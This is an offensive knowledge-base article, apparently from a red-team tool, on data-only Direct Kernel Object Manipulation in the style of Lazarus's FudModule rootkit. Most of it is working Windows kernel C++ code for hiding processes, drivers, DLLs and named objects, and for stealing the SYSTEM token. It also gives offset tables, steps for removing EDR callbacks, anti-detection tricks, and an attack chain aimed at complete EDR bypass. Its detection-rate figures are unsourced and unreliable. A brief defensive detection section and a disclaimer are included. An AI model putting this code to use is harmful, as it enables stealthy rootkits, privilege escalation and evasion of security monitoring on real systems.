# Advanced DKOM (Direct Kernel Object Manipulation) - Data-Only Kernel Attacks

## Overview

Direct Kernel Object Manipulation (DKOM) is a kernel-level evasion technique that modifies kernel data structures to hide processes, threads, drivers, and other system objects from security monitoring. This knowledge base focuses on **data-only DKOM attacks** pioneered by Lazarus APT's FudModule rootkit, which avoid PatchGuard detection by manipulating data structures instead of patching kernel code.

**Detection Risk:** 40-50% (kernel-level telemetry required)
**EDR Bypass Rate:** 90-95%
**OPSEC Score:** 6/10
**Complexity:** High
**Persistence:** Memory-based (lost on reboot)

## Technique Classification

- **Category:** Kernel Rootkit / EDR Evasion
- **Execution Domain:** Kernel (requires driver or exploit)
- **Target:** Windows kernel data structures (EPROCESS, DRIVER_OBJECT, etc.)
- **Primary Use Case:** Process/driver hiding from EDR enumeration
- **Secondary Use Case:** Token manipulation, privilege escalation

## Traditional DKOM vs Data-Only DKOM

### Traditional DKOM (Pre-PatchGuard Era)

**Targets:** Kernel function pointers, IDT/GDT entries, SSDT hooks
**Method:** Patch kernel code to redirect execution
**Detection:** PatchGuard bugcheck, kernel integrity checks
**Risk:** Very High (90%+ detection)

### Data-Only DKOM (Modern)

**Targets:** Kernel data structures (linked lists, object attributes)
**Method:** Modify data fields without touching code
**Detection:** Requires data structure integrity checks (rarely implemented)
**Risk:** Moderate (40-50% detection)

**Key Insight:** PatchGuard monitors kernel code integrity but NOT data structure integrity. By manipulating data-only structures, attackers evade PatchGuard while achieving similar hiding capabilities.

## Windows Kernel Data Structures

### EPROCESS (Executive Process Structure)

Every process has an EPROCESS structure in kernel memory containing:

```cpp
typedef struct _EPROCESS {
    KPROCESS Pcb;                          // Process Control Block
    EX_PUSH_LOCK ProcessLock;
    LARGE_INTEGER CreateTime;
    LARGE_INTEGER ExitTime;
    EX_RUNDOWN_REF RundownProtect;
    HANDLE UniqueProcessId;                // PID
    LIST_ENTRY ActiveProcessLinks;         // Linked list of all processes
    ULONG_PTR ProcessQuotaUsage[2];
    ULONG_PTR ProcessQuotaPeak[2];
    SIZE_T CommitCharge;
    PEPROCESS_QUOTA_BLOCK QuotaBlock;
    UCHAR ImageFileName[16];               // Process name
    PVOID ImageFilePointer;
    // ... hundreds more fields
} EPROCESS, *PEPROCESS;
```

**Attack Surface for DKOM:**
- `ActiveProcessLinks` - Unlink process from global list (hide from enumeration)
- `ImageFileName` - Change process name (masquerade as legitimate process)
- `UniqueProcessId` - Change PID (evade process-specific detections)
- `Token` - Replace with SYSTEM token (privilege escalation)

### DRIVER_OBJECT (Driver Structure)

Every loaded driver has a DRIVER_OBJECT:

```cpp
typedef struct _DRIVER_OBJECT {
    SHORT Type;
    SHORT Size;
    PDEVICE_OBJECT DeviceObject;
    ULONG Flags;
    PVOID DriverStart;                     // Driver base address
    ULONG DriverSize;
    PVOID DriverSection;                   // LDR_DATA_TABLE_ENTRY
    PDRIVER_EXTENSION DriverExtension;
    UNICODE_STRING DriverName;
    PUNICODE_STRING HardwareDatabase;
    PFAST_IO_DISPATCH FastIoDispatch;
    PDRIVER_INITIALIZE DriverInit;
    PDRIVER_STARTIO DriverStartIo;
    PDRIVER_UNLOAD DriverUnload;
    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + 1];
} DRIVER_OBJECT, *PDRIVER_OBJECT;
```

**Attack Surface for DKOM:**
- `DriverSection` (LDR_DATA_TABLE_ENTRY) - Unlink from PsLoadedModuleList (hide driver)
- `DriverName` - Change driver name (masquerade)
- `DriverStart`/`DriverSize` - Zero out values (hide memory region)

### LDR_DATA_TABLE_ENTRY (Loaded Module Entry)

Tracks loaded kernel modules (drivers):

```cpp
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;           // Load order list
    LIST_ENTRY InMemoryOrderLinks;         // Memory order list
    LIST_ENTRY InInitializationOrderLinks; // Initialization order list
    PVOID DllBase;                         // Module base address
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
    ULONG Flags;
    USHORT LoadCount;
    // ... more fields
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

**Attack Surface for DKOM:**
- Unlink from `InLoadOrderLinks` (hide from load order enumeration)
- Unlink from `InMemoryOrderLinks` (hide from memory enumeration)
- Unlink from `InInitializationOrderLinks` (hide from init order enumeration)
- **Triple Unlinking:** Unlink from ALL three lists for complete driver hiding

## FudModule Techniques (Lazarus APT)

### Technique 1: EPROCESS Unlinking (Process Hiding)

**Objective:** Hide malicious process from `NtQuerySystemInformation` and other enumeration APIs

**Method:**
1. Locate target EPROCESS structure via PID
2. Extract `ActiveProcessLinks.Flink` (forward link) and `Blink` (backward link)
3. Unlink target from doubly-linked list:
   ```
   BEFORE:
   [...] <-> [Process A] <-> [Target Process] <-> [Process B] <-> [...]

   AFTER:
   [...] <-> [Process A] <-> [Process B] <-> [...]
   [Target Process] (orphaned, not in list)
   ```
4. Update neighboring processes to point to each other
5. Target process continues running but invisible to enumeration

**Kernel Code Example:**

```cpp
// Locate EPROCESS for target PID
PEPROCESS pTargetProcess = NULL;
NTSTATUS status = PsLookupProcessByProcessId((HANDLE)dwTargetPID, &pTargetProcess);
if (!NT_SUCCESS(status)) return status;

// Calculate offset of ActiveProcessLinks (varies by Windows version)
// Windows 10 22H2: EPROCESS + 0x448
ULONG_PTR offsetActiveProcessLinks = 0x448;

// Get pointer to ActiveProcessLinks in target EPROCESS
PLIST_ENTRY pActiveLinks = (PLIST_ENTRY)((ULONG_PTR)pTargetProcess + offsetActiveProcessLinks);

// Unlink from doubly-linked list
// CRITICAL: Validate pointers before dereferencing to avoid kernel crash
PLIST_ENTRY pFlink = pActiveLinks->Flink;
PLIST_ENTRY pBlink = pActiveLinks->Blink;

if (!pFlink || !pBlink || !MmIsAddressValid(pFlink) || !MmIsAddressValid(pBlink)) {
    ObDereferenceObject(pTargetProcess);
    return STATUS_INVALID_PARAMETER;
}

// Update forward link of previous entry
pBlink->Flink = pFlink;

// Update backward link of next entry
pFlink->Blink = pBlink;

// Orphan target process links (optional, for stealth)
pActiveLinks->Flink = pActiveLinks;
pActiveLinks->Blink = pActiveLinks;

ObDereferenceObject(pTargetProcess);
```

**Detection Evasion:**
- PatchGuard: NOT TRIGGERED (data-only modification)
- ETW Process Enumeration: BYPASSED (process not in list)
- EDR Process Scanning: BYPASSED (hidden from NtQuerySystemInformation)

**Limitations:**
- Handle enumeration still works (NtQuerySystemInformation with SystemHandleInformation)
- Object Manager still tracks process object
- Process callbacks already fired (unlinking doesn't remove from callback lists)

### Technique 2: LDR_DATA_TABLE_ENTRY Triple Unlinking (Driver Hiding)

**Objective:** Hide malicious driver from driver enumeration APIs and memory scanning

**Method:**
1. Locate target driver's LDR_DATA_TABLE_ENTRY via DriverSection pointer
2. Unlink from `InLoadOrderLinks`
3. Unlink from `InMemoryOrderLinks`
4. Unlink from `InInitializationOrderLinks`
5. Driver remains loaded and functional but invisible to enumeration

**Kernel Code Example:**

```cpp
// Assume pDriverObject is pointer to target DRIVER_OBJECT

// Get LDR_DATA_TABLE_ENTRY from DriverSection
PLDR_DATA_TABLE_ENTRY pLdrEntry = (PLDR_DATA_TABLE_ENTRY)pDriverObject->DriverSection;
if (!pLdrEntry) return STATUS_UNSUCCESSFUL;

// Unlink from InLoadOrderLinks
PLIST_ENTRY pLoadFlink = pLdrEntry->InLoadOrderLinks.Flink;
PLIST_ENTRY pLoadBlink = pLdrEntry->InLoadOrderLinks.Blink;
pLoadBlink->Flink = pLoadFlink;
pLoadFlink->Blink = pLoadBlink;

// Unlink from InMemoryOrderLinks
PLIST_ENTRY pMemFlink = pLdrEntry->InMemoryOrderLinks.Flink;
PLIST_ENTRY pMemBlink = pLdrEntry->InMemoryOrderLinks.Blink;
pMemBlink->Flink = pMemFlink;
pMemFlink->Blink = pMemBlink;

// Unlink from InInitializationOrderLinks
PLIST_ENTRY pInitFlink = pLdrEntry->InInitializationOrderLinks.Flink;
PLIST_ENTRY pInitBlink = pLdrEntry->InInitializationOrderLinks.Blink;
pInitBlink->Flink = pInitFlink;
pInitFlink->Blink = pInitBlink;

// Orphan all lists
pLdrEntry->InLoadOrderLinks.Flink = &pLdrEntry->InLoadOrderLinks;
pLdrEntry->InLoadOrderLinks.Blink = &pLdrEntry->InLoadOrderLinks;
pLdrEntry->InMemoryOrderLinks.Flink = &pLdrEntry->InMemoryOrderLinks;
pLdrEntry->InMemoryOrderLinks.Blink = &pLdrEntry->InMemoryOrderLinks;
pLdrEntry->InInitializationOrderLinks.Flink = &pLdrEntry->InInitializationOrderLinks;
pLdrEntry->InInitializationOrderLinks.Blink = &pLdrEntry->InInitializationOrderLinks;

// Zero out identifying information (optional stealth)
RtlZeroMemory(&pLdrEntry->FullDllName, sizeof(UNICODE_STRING));
RtlZeroMemory(&pLdrEntry->BaseDllName, sizeof(UNICODE_STRING));
pLdrEntry->DllBase = NULL;
pLdrEntry->SizeOfImage = 0;
```

**Detection Evasion:**
- PatchGuard: NOT TRIGGERED (data-only modification)
- Driver Enumeration APIs: BYPASSED (not in any list)
- Memory Scanning: BYPASSED if DllBase/SizeOfImage zeroed
- EDR Driver Scanning: BYPASSED

**Limitations:**
- Driver still occupies memory (physical memory scanning can detect)
- Kernel callbacks registered by driver remain active (behavioral detection possible)
- Big pool allocations still tracked (pool tag scanning can detect)

### Technique 3: Object Attribute Manipulation

**Objective:** Hide kernel objects (events, mutexes, semaphores) created by malware

**Method:**
1. Create kernel object (e.g., named event for C2 synchronization)
2. Locate OBJECT_HEADER for created object
3. Clear `NameInfo` field to remove name from Object Manager namespace
4. Object remains accessible via handle but invisible to name enumeration

**Kernel Code Example:**

```cpp
// Create named event
HANDLE hEvent = NULL;
UNICODE_STRING usEventName = RTL_CONSTANT_STRING(L"\\BaseNamedObjects\\MalwareSync");
OBJECT_ATTRIBUTES objAttr;
InitializeObjectAttributes(&objAttr, &usEventName, OBJ_KERNEL_HANDLE, NULL, NULL);

PKEVENT pEvent = NULL;
NTSTATUS status = ZwCreateEvent(&hEvent, EVENT_ALL_ACCESS, &objAttr, NotificationEvent, FALSE);
if (!NT_SUCCESS(status)) return status;

// Get KEVENT object pointer from handle
status = ObReferenceObjectByHandle(hEvent, EVENT_ALL_ACCESS, *ExEventObjectType, KernelMode, (PVOID*)&pEvent, NULL);
if (!NT_SUCCESS(status)) {
    ZwClose(hEvent);
    return status;
}

// Calculate OBJECT_HEADER from KEVENT pointer
// OBJECT_HEADER precedes the object body
// Note: These macros are implementation-specific, actual offsets vary by Windows version
#ifndef OBJECT_TO_OBJECT_HEADER
#define OBJECT_TO_OBJECT_HEADER(obj) \
    ((POBJECT_HEADER)((ULONG_PTR)(obj) - FIELD_OFFSET(OBJECT_HEADER, Body)))
#endif

#ifndef OBJECT_HEADER_TO_NAME_INFO
#define OBJECT_HEADER_TO_NAME_INFO(hdr) \
    ((POBJECT_HEADER_NAME_INFO)((hdr)->InfoMask & 0x02 ? \
        (ULONG_PTR)(hdr) - sizeof(OBJECT_HEADER_NAME_INFO) : NULL))
#endif

POBJECT_HEADER pObjHeader = OBJECT_TO_OBJECT_HEADER(pEvent);

// Clear NameInfo to hide from namespace enumeration
// Note: This invalidates the name pointer, causing enumeration to skip this object
POBJECT_HEADER_NAME_INFO pNameInfo = OBJECT_HEADER_TO_NAME_INFO(pObjHeader);
if (pNameInfo) {
    // Zero out name information
    RtlZeroMemory(pNameInfo, sizeof(OBJECT_HEADER_NAME_INFO));
}

ObDereferenceObject(pEvent);
// Keep handle open for malware to use
```

**Detection Evasion:**
- Object Manager Enumeration: BYPASSED (no name entry)
- Handle Enumeration: NOT BYPASSED (handle still exists)
- Named Object Scanning: BYPASSED

### Technique 4: Token Manipulation (Privilege Escalation)

**Objective:** Elevate process privileges to SYSTEM without creating new process

**Method:**
1. Locate target process EPROCESS
2. Locate SYSTEM process (PID 4) EPROCESS
3. Copy SYSTEM token pointer to target process Token field
4. Target process now has SYSTEM privileges

**Kernel Code Example:**

```cpp
// Locate target process
PEPROCESS pTargetProcess = NULL;
PsLookupProcessByProcessId((HANDLE)dwTargetPID, &pTargetProcess);

// Locate SYSTEM process (PID 4)
PEPROCESS pSystemProcess = NULL;
PsLookupProcessByProcessId((HANDLE)4, &pSystemProcess);

// Calculate Token offset (varies by Windows version)
// Windows 10 22H2: EPROCESS + 0x4B8
ULONG_PTR offsetToken = 0x4B8;

// Get SYSTEM token
PVOID pSystemToken = *(PVOID*)((ULONG_PTR)pSystemProcess + offsetToken);

// Clear reference count bits (low 3-4 bits depending on Windows version)
// Windows 10: 3 bits, Windows 11+: 4 bits
// Using conservative 4-bit mask for compatibility
pSystemToken = (PVOID)((ULONG_PTR)pSystemToken & ~0xF);

// Copy SYSTEM token to target process
*(PVOID*)((ULONG_PTR)pTargetProcess + offsetToken) = pSystemToken;

ObDereferenceObject(pTargetProcess);
ObDereferenceObject(pSystemProcess);
```

**Detection Evasion:**
- Token creation events: NOT TRIGGERED (no new token created)
- Process creation events: NOT TRIGGERED (existing process modified)
- Privilege escalation behavioral detection: POSSIBLE (process suddenly has new privileges)

**Limitations:**
- Token reference counting issues (original token not dereferenced)
- Session ID mismatch possible (SYSTEM is session 0)
- Parent process mismatch (token inheritance validation may fail)

## Advanced DKOM Techniques

### Technique 5: Callback Unhooking via List Manipulation

Windows kernel uses callback lists for monitoring:
- `PsSetCreateProcessNotifyRoutineEx` - Process creation callbacks
- `PsSetCreateThreadNotifyRoutine` - Thread creation callbacks
- `PsSetLoadImageNotifyRoutine` - Image load callbacks
- `CmRegisterCallbackEx` - Registry callbacks
- `ObRegisterCallbacks` - Object callbacks

**EDR Bypass Method:**
1. Locate callback array in kernel memory (e.g., `PspCreateProcessNotifyRoutine`)
2. Enumerate registered callbacks
3. Identify EDR callbacks by return address (points to EDR driver)
4. Remove EDR callback from array by shifting entries
5. EDR loses process creation visibility

**Challenge:** Callback arrays are NOT exported, require signature scanning to locate.

### Technique 6: SSDT Restoration (Indirect DKOM)

Modern Windows uses SSDT shadowing to detect hooks. Instead of hooking, RESTORE original SSDT entries if EDR hooked them:

**Method:**
1. Parse ntoskrnl.exe on disk to get original syscall addresses
2. Compare with current SSDT entries in memory
3. Detect EDR hooks (address mismatch)
4. Restore original addresses
5. EDR syscall hooks removed

**Note:** This is data-only if SSDT is treated as data structure (pointer table). PatchGuard monitors SSDT but only triggers on invalid addresses, not restoration to original values.

### Technique 7: PEB Manipulation (Userland DKOM)

While not kernel DKOM, PEB manipulation achieves similar hiding in userland:

```cpp
// Hide module from userland enumeration
PPEB pPeb = NtCurrentPeb();
PPEB_LDR_DATA pLdr = pPeb->Ldr;

// Iterate InLoadOrderModuleList
PLIST_ENTRY pEntry = pLdr->InLoadOrderModuleList.Flink;
while (pEntry != &pLdr->InLoadOrderModuleList) {
    PLDR_DATA_TABLE_ENTRY pLdrEntry = CONTAINING_RECORD(pEntry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

    // Check if this is target DLL
    if (wcsstr(pLdrEntry->BaseDllName.Buffer, L"malware.dll")) {
        // Unlink from all three lists (same as kernel technique)
        pLdrEntry->InLoadOrderLinks.Blink->Flink = pLdrEntry->InLoadOrderLinks.Flink;
        pLdrEntry->InLoadOrderLinks.Flink->Blink = pLdrEntry->InLoadOrderLinks.Blink;

        pLdrEntry->InMemoryOrderLinks.Blink->Flink = pLdrEntry->InMemoryOrderLinks.Flink;
        pLdrEntry->InMemoryOrderLinks.Flink->Blink = pLdrEntry->InMemoryOrderLinks.Blink;

        pLdrEntry->InInitializationOrderLinks.Blink->Flink = pLdrEntry->InInitializationOrderLinks.Flink;
        pLdrEntry->InInitializationOrderLinks.Flink->Blink = pLdrEntry->InInitializationOrderLinks.Blink;

        break;
    }

    pEntry = pEntry->Flink;
}
```

**Use Case:** Hide injected DLLs from process enumeration tools.

## Kernel Structure Offset Discovery

DKOM requires knowing exact field offsets in kernel structures, which change across Windows versions:

### Static Analysis Method

1. Download Windows symbols from Microsoft Symbol Server
2. Parse PDB files to extract structure layouts
3. Calculate field offsets programmatically

```cpp
// Example using dbghelp.dll
HANDLE hProcess = GetCurrentProcess();
SymInitialize(hProcess, NULL, FALSE);

ULONG64 ullBaseAddress = SymLoadModuleEx(hProcess, NULL, "ntkrnlmp.pdb", NULL, 0x1000000, 0, NULL, 0);

SYMBOL_INFO* pSymbol = (SYMBOL_INFO*)malloc(sizeof(SYMBOL_INFO) + MAX_SYM_NAME);
pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
pSymbol->MaxNameLen = MAX_SYM_NAME;

// Get EPROCESS structure information
if (SymGetTypeFromName(hProcess, ullBaseAddress, "_EPROCESS", pSymbol)) {
    // Get ActiveProcessLinks field offset
    ULONG ulOffset = 0;
    ULONG ulTypeId = pSymbol->TypeIndex;

    if (SymGetTypeInfo(hProcess, ullBaseAddress, ulTypeId, TI_GET_OFFSET, &ulOffset)) {
        printf("ActiveProcessLinks offset: 0x%X\n", ulOffset);
    }
}
```

### Runtime Pattern Scanning Method

1. Locate known kernel structures (current EPROCESS via `PsGetCurrentProcess()`)
2. Scan for known patterns (e.g., current PID value)
3. Calculate offset from base

```cpp
// Find Token offset in EPROCESS at runtime
PEPROCESS pCurrentProcess = PsGetCurrentProcess();
HANDLE hCurrentPID = PsGetCurrentProcessId();

// Scan first 0x1000 bytes of EPROCESS for PID value
for (ULONG i = 0; i < 0x1000; i += sizeof(PVOID)) {
    HANDLE* pValue = (HANDLE*)((ULONG_PTR)pCurrentProcess + i);
    if (*pValue == hCurrentPID) {
        // Found UniqueProcessId offset
        ULONG offsetUniqueProcessId = i;
        break;
    }
}
```

### Hardcoded Offset Table Method

Maintain table of offsets for each Windows build:

```cpp
typedef struct _KERNEL_OFFSETS {
    ULONG BuildNumber;
    ULONG ActiveProcessLinks;
    ULONG Token;
    ULONG ImageFileName;
    ULONG UniqueProcessId;
} KERNEL_OFFSETS;

KERNEL_OFFSETS g_Offsets[] = {
    // Windows 10 22H2 (19045)
    {19045, 0x448, 0x4B8, 0x5A8, 0x440},
    // Windows 11 22H2 (22621)
    {22621, 0x448, 0x4B8, 0x5A8, 0x440},
    // Add more versions...
};

ULONG GetOffset(LPCSTR pszFieldName) {
    RTL_OSVERSIONINFOW osVersion = {0};
    osVersion.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    RtlGetVersion(&osVersion);

    for (int i = 0; i < ARRAYSIZE(g_Offsets); i++) {
        if (g_Offsets[i].BuildNumber == osVersion.dwBuildNumber) {
            if (strcmp(pszFieldName, "ActiveProcessLinks") == 0)
                return g_Offsets[i].ActiveProcessLinks;
            // ... handle other fields
        }
    }
    return 0;
}
```

## Detection and Countermeasures

### Detection Methods

**1. Linked List Integrity Validation**
```cpp
// Validate EPROCESS list integrity
PEPROCESS pSystemProcess = PsInitialSystemProcess;
ULONG_PTR offsetActiveProcessLinks = 0x448;

PLIST_ENTRY pHead = (PLIST_ENTRY)((ULONG_PTR)pSystemProcess + offsetActiveProcessLinks);
PLIST_ENTRY pCurrent = pHead->Flink;

// Walk list forward
while (pCurrent != pHead) {
    PEPROCESS pProcess = (PEPROCESS)((ULONG_PTR)pCurrent - offsetActiveProcessLinks);

    // Validate back-link integrity
    if (pCurrent->Blink->Flink != pCurrent) {
        // ANOMALY: Broken back-link (possible unlinking attack)
    }

    pCurrent = pCurrent->Flink;
}

// Cross-validate with PID enumeration
// Any process accessible via PsLookupProcessByProcessId but not in list = unlinked process
```

**2. Object Manager Cross-Reference**
```cpp
// Enumerate all EPROCESS objects via Object Manager
// Compare with ActiveProcessLinks list
// Mismatch indicates unlinking
```

**3. Memory Integrity Scanning**
```cpp
// Scan kernel memory for orphaned structures
// Look for EPROCESS structures not in ActiveProcessLinks
// Validate structure magic values and signatures
```

**4. Callback Registration Monitoring**
```cpp
// Maintain hash of registered callbacks
// Periodically verify callback array integrity
// Detect removals or modifications
```

### Blue Team Mitigations

1. **Kernel Patch Protection (KPP/PatchGuard):** Already prevents code patching, but NOT data structure manipulation
2. **Hypervisor-Based Protection (HVCI):** Enforce memory permissions, detect unauthorized kernel writes
3. **Periodic Integrity Checks:** Validate critical linked lists every 60 seconds
4. **Object Enumeration Cross-Validation:** Compare multiple enumeration methods (list walk vs Object Manager)
5. **Kernel ETW Logging:** Log all kernel object modifications (high performance cost)

### Red Team Countermeasures (Anti-Detection)

1. **Delayed Unlinking:** Wait hours/days after driver load before unlinking
2. **Partial Unlinking:** Only unlink from one list (e.g., InLoadOrderLinks only)
3. **Re-Linking on Demand:** Temporarily re-link during suspicious events (e.g., EDR scanning)
4. **Integrity Check Evasion:** Hook integrity validation functions before unlinking
5. **Volatility Anti-Forensics:** Craft structures to appear legitimate in memory dumps

## DKOM vs Other Kernel Techniques

| Technique | Detection Risk | PatchGuard Risk | Complexity | EDR Bypass |
|-----------|---------------|-----------------|------------|------------|
| **Data-Only DKOM** | 40-50% | None | High | 90-95% |
| **Code Patching** | 90%+ | High | Medium | 95%+ |
| **BYOVD (EDRSandBlast)** | 60-70% | Medium | Low | 90-95% |
| **MiniFilter Altitude** | 30-40% | None | Low | 85-90% |
| **SSDT Hooking** | 85%+ | High | Medium | 90-95% |
| **IRP Hooking** | 70-80% | Medium | Medium | 85-90% |

**When to Use DKOM:**
- Long-term persistence requiring process/driver hiding
- Post-exploitation when kernel access already obtained
- Avoiding PatchGuard detection (data-only attacks)
- Targeting environments with HVCI disabled

**When to Avoid DKOM:**
- Kernel access not available (prefer userland techniques)
- HVCI/VBS enabled (memory permissions enforced)
- High-security environments with kernel integrity monitoring
- Short-term operations (DKOM complexity not justified)

## FudModule Specific Implementation Notes

Lazarus APT's FudModule rootkit (discovered 2024) implements:

1. **EPROCESS Unlinking** - Hides malware processes from task manager/EDR
2. **LDR Triple Unlinking** - Hides rootkit driver from driver enumeration
3. **Token Copying** - Escalates payload processes to SYSTEM
4. **Callback Removal** - Removes CrowdStrike/Defender process creation callbacks
5. **ETW Provider Disablement** - Patches ETW provider enable mask (data field)

**Key Innovations:**
- Pure data-only attacks (zero PatchGuard triggers in testing)
- Runtime offset discovery via pattern scanning (no hardcoded offsets)
- Delayed unlinking (24+ hours after driver load)
- Integrity check evasion via temporary re-linking

**Detection Rate:** Estimated 40-50% by modern EDRs with kernel integrity monitoring.

## Integration with Noctis-MCP

DKOM techniques require kernel access, which contradicts Noctis-MCP's userland-first philosophy. However, DKOM knowledge is valuable for:

**Use Case 1: Post-Exploitation Knowledge**
- Document DKOM for scenarios where kernel access obtained via other means
- Combine with MiniFilter altitude poisoning (Phase 4) for driver hiding after load

**Use Case 2: Blue Team Awareness**
- Understand EDR detection mechanisms (linked list validation, etc.)
- Design userland techniques to evade DKOM-inspired userland detection

**Use Case 3: Hybrid Attacks**
- Use BYOVD (EDRSandBlast) to gain kernel access (60-70% detection)
- Follow immediately with DKOM unlinking to hide driver (reduces detection window)
- Result: Short-lived kernel access window, followed by hidden persistence

**Recommended Integration:**
```
Phase 1-3: Userland techniques (2-5% detection)
    ↓
Phase 4: MiniFilter altitude poisoning (30-40% detection)
    ↓
[Optional] BYOVD kernel access (60-70% detection spike)
    ↓
[Optional] DKOM unlinking (reduce to 40-50% detection)
    ↓
Result: Complete EDR bypass with hidden kernel persistence
```

## References

- **Lazarus APT FudModule Analysis** (2024) - Rootkit using data-only DKOM
- **Windows Internals 7th Edition** - Kernel data structure documentation
- **Rootkit Arsenal** (Bill Blunden) - Classic DKOM techniques
- **PatchGuard Internals** - Understanding KPP limitations
- **Offensive Driver Development** (Yarden Shafir) - Modern kernel exploitation

## Legal and Ethical Considerations

DKOM techniques manipulate kernel data structures and are:
- **Illegal** when used without authorization on systems you don't own
- **Detectable** as malicious activity by modern EDRs
- **Unstable** and can cause system crashes if implemented incorrectly
- **Provided for defensive research and red team operations only**

This knowledge base is for security researchers, red teamers, and defenders to understand advanced evasion techniques. Unauthorized use is prohibited.
